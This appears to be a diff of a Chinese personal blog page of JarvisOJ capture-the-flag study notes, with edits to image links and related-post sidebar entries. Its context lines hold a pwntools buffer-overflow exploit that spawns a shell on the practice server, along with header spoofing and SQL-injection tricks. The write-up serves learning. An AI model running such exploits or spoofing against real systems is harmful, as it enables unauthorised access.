@@ -420,8 +420,8 @@ RET
 
 提交格式：PCTF{你的答案}</code></pre><p>试了好几种方法，最后用OD解决。</p>
 <p>把题目给的添加到OD里，然后查看该位置的16进制，去完空格加上PCTF{}，提交，OK。</p>
-<p><img src="/.com//%5CJarvisoj%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%5CROPGadget1.png" alt></p>
-<p><img src="/.com//%5CJarvisoj%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%5CROPGadget2.png" alt></p>
+<p><img src="https://github.com/stone-o/stone-o.github.io/blob/master/2019/06/02/jarvisoj%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ROPGadget2.png" alt></p>
+<p><img src="https://github.com/stone-o/stone-o.github.io/blob/master/2019/06/02/jarvisoj%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ROPGadget2.png" alt></p>
 <h2 id="0x14-爱吃培根的出题人"><a href="#0x14-爱吃培根的出题人" class="headerlink" title="0x14 爱吃培根的出题人"></a>0x14 爱吃培根的出题人</h2><pre><code>听说你也喜欢吃培根？那我们一起来欣赏一段培根的介绍吧：
 
 bacoN is one of aMerICa&apos;S sWEethEartS. it&apos;s A dARlinG, SuCCulEnt fOoD tHAt PaIRs FlawLE
@@ -454,7 +454,7 @@ bacoN is one of aMerICa&apos;S sWEethEartS. it&apos;s A dARlinG, SuCCulEnt fOoD 
 <p><img src="/.com//%5CJarvisoj%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%5Clevel0_1.png" alt></p>
 <p>这是一道入门签到型的栈溢出，只开启了NX。然后把程序送进IDA里，在字符串中发现“/bin/sh”，它所在的函数地址为0x400596，溢出地址就确定了。</p>
 <p><img src="/.com//%5CJarvisoj%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%5Clevel0_2.png" alt></p>
-<p>接下来又在main函数中找到一个vulnerable_function函数，只知道他的功能是先<br>扩出一个大小为0x80的栈，但是read()读取了0x200个字符，然后我们利用这个缺陷执行到我们想要执行的地方。</p>
+<p>接下来又在main函数中找到一个vulnerable_function函数，只知道他的功能是先扩出一个大小为0x80的栈，但是read()读取了0x200个字符，然后我们利用这个缺陷执行到我们想要执行的地方。</p>
 <p><img src="/.com//%5CJarvisoj%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%5Clevel0_3.png" alt></p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#! /usr/bin/env python2</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9881</span>)</span><br><span class="line">context(log_level = <span class="string">'debug'</span>,arch = <span class="string">'amd64'</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = <span class="number">0x400596</span></span><br><span class="line">payload = <span class="string">'A'</span>*(<span class="number">0x80</span>+<span class="number">8</span>) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure>
 
@@ -475,7 +475,7 @@ bacoN is one of aMerICa&apos;S sWEethEartS. it&apos;s A dARlinG, SuCCulEnt fOoD 
 题目链接：http://web.jarvisoj.com:32772/</code></pre><p>在百度上得到这两条信息，ffifdyop ，<br>276f722736c95d99e921722cf9ed621c (‘or’6<trash>)<br>然而并不明白是怎么回事，先记着，等懂了再来看</trash></p>
 <h2 id="0x2-admin"><a href="#0x2-admin" class="headerlink" title="0x2 admin"></a>0x2 admin</h2><pre><code>题目入口：http://web.jarvisoj.com:32792/</code></pre><p>进了之后只有一个hello world，经大佬指点，去看看robots.txt，去看了发现一个php，访问后返回<em>flag{hello guest}</em>，提交后不对，看着其实也不像，中间还是空格，和以往的格式不太一样，然后抓包把admin改成等于1，得到flag。</p>
 <h2 id="0x3-LOCALHOST"><a href="#0x3-LOCALHOST" class="headerlink" title="0x3 LOCALHOST"></a>0x3 LOCALHOST</h2><pre><code>题目入口：http://web.jarvisoj.com:32774/</code></pre><p>直接在请求头中加入X-Forwarded-For: 127.0.0.1，伪造出localhost。</p>
-<h2 id="0x4-PORT51"><a href="#0x4-PORT51" class="headerlink" title="0x4 PORT51"></a>0x4 PORT51</h2><pre><code>题目链接：http://web.jarvisoj.com:32770/</code></pre><p>在请求中加入X-Forwarded-For: 127.0.0.1:51后还是不行，想着用python指定端口访问，然后发现curl可以指定端口访问相应目录，又在主机和虚拟机中使用<figure class="highlight plain"><figcaption><span>--local-port 51</span><a href="http://web.jarvisoj.com:32770/```,都是和其他端口相同，有一个提示，并没有flag，然后在服务器中执行同样的命令，得到flag：PCTF&#123;M45t3r_oF_CuRl&#125;" target="_blank" rel="noopener">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># tools</span><br><span class="line"></span><br><span class="line">## 0x1 uncompyle6</span><br><span class="line">&gt; 遇到一道pyc的逆向题，之前使用的是在线版的[pyc解密](https://tool.lu/pyc/),偶然间发现一款本地版的，uncompyle6，使用pip直接安装，或者在[项目地址](https://github.com/rocky/python-uncompyle6)进行下载安装。</span><br><span class="line"></span><br><span class="line">```s</span><br><span class="line">uncompyle  a.pyc  &gt;  a.py</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x4-PORT51"><a href="#0x4-PORT51" class="headerlink" title="0x4 PORT51"></a>0x4 PORT51</h2><pre><code>题目链接：http://web.jarvisoj.com:32770/</code></pre><p>在请求中加入X-Forwarded-For: 127.0.0.1:51后还是不行，想着用python指定端口访问，然后发现curl可以指定端口访问相应目录，又在主机和虚拟机中使用<figure class="highlight plain"><figcaption><span>--local-port 51</span><a href="http://web.jarvisoj.com:32770/```,都是和其他端口相同，有一个提示，并没有flag，然后在服务器中执行同样的命令，得到flag：PCTF&#123;M45t3r_oF_CuRl&#125;" target="_blank" rel="noopener">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># tools</span><br><span class="line"></span><br><span class="line">## 0x1 uncompyle6</span><br><span class="line">&gt; 遇到一道pyc的逆向题，之前使用的是在线版的[pyc解密](https://tool.lu/pyc/),偶然间发现一款本地版的，uncompyle6，使用pip直接安装，或者在[项目地址](https://github.com/rocky/python-uncompyle6)进行下载安装。</span><br><span class="line"></span><br><span class="line">```s</span><br><span class="line">uncompyle  a.pyc  &gt;  a.py</span><br></pre></td></tr></table></figure></p>
 	
 	</div>
 	
@@ -517,6 +517,56 @@ bacoN is one of aMerICa&apos;S sWEethEartS. it&apos;s A dARlinG, SuCCulEnt fOoD 
 <div class="relate-post">
 	
 		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/09/21/11款MBP更新系统( OS X El Capitan)/" title="老款MBP更新系统（ OS X El Capitan）">
+								老款MBP更新系统（ OS X El Capitan）			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								九月 21日, 2019				
+							</p>
+							<p class="relate-post-content">
+								写在前面盆友有一个电脑不用，我就劝告他让他拿这台电脑扶贫，所以我拿到了这台11款的MBP。听说是11年当时的顶配，奈何资金不足从来都是只摸过没用过，不太了解它的行情。
+
+英特尔i7的处理器，4G的内存，现在我感觉除了内存小点，跟主流的...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/09/21/11款MBP更新系统( OS X El Capitan)/" title="老款MBP更新系统（ OS X El Capitan）">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="老款MBP更新系统（ OS X El Capitan）"/>
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/09/18/计算机网络/" title="计算机网络">
+								计算机网络			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								九月 18日, 2019				
+							</p>
+							<p class="relate-post-content">
+								计算机网络的功能
+1.数据通信（连通性）
+
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/09/18/计算机网络/" title="计算机网络">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="计算机网络"/>
+							</a>
+						</div>
+					</li>											
+			
 			
 					<li>
 						<div class="relate-post-text">
@@ -755,33 +805,6 @@ su: Authentication fai...
 							<a href="/2018/04/13/su-root命令验证失败/" title="su root命令验证失败">				
 								
 								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="su root命令验证失败"/>
-							</a>
-						</div>
-					</li>											
-			
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2018/03/05/Ubuntu卸载已安装软件/" title="Ubuntu卸载已安装软件">
-								Ubuntu卸载已安装软件			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								三月 5日, 2018				
-							</p>
-							<p class="relate-post-content">
-								1、卸载
-sudo apt-get remove ***2、卸载软件及其依赖
-sudo apt-get remove --auto-remove ***3、清除该软件
-sudo apt-get purge ***或者
-sudo apt...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2018/03/05/Ubuntu卸载已安装软件/" title="Ubuntu卸载已安装软件">				
-								
-								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="Ubuntu卸载已安装软件"/>
 							</a>
 						</div>
 					</li>											
